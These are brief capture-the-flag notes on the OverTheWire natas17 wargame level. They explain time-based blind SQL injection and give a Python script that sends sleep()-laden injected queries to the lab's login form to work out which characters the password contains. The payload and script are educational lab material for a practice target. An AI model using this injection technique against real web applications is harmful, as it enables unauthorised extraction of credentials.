 # CTF Notes

source: https://www.abatchy.com/2016/12/natas-level-17
From the natas17 challenge. Bruteforce password through SQL injection though there is not output. If there is no output use the `AND sleep()` command in the query to control the response time. If the query was correct i.e char is in there, the `sleep()` will trigger and the response time will be slower. This can be checked in python using `requests`.

```py
import requests
from requests.auth import HTTPBasicAuth

url = "http://natas17.natas.labs.overthewire.org/index.php?debug"
auth_user = "natas17"
auth_pass = "<censored>"

chars = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""
passwd = ""


for char in chars: # checks which characters are in the password
    # if the query is successful it will add a 1 second relay
    input_data = {"username": 'natas18" and password LIKE BINARY "%{}%" AND sleep(1) # '.format(char)}
    r = requests.post(url, auth=HTTPBasicAuth(auth_user, auth_pass), data=input_data)
    if "01." in str(r.elapsed): # "01." specifies that the response took 1 second, from sleep(), can increase if network is slower
        print(r.elapsed, char)
        filtered += char

```
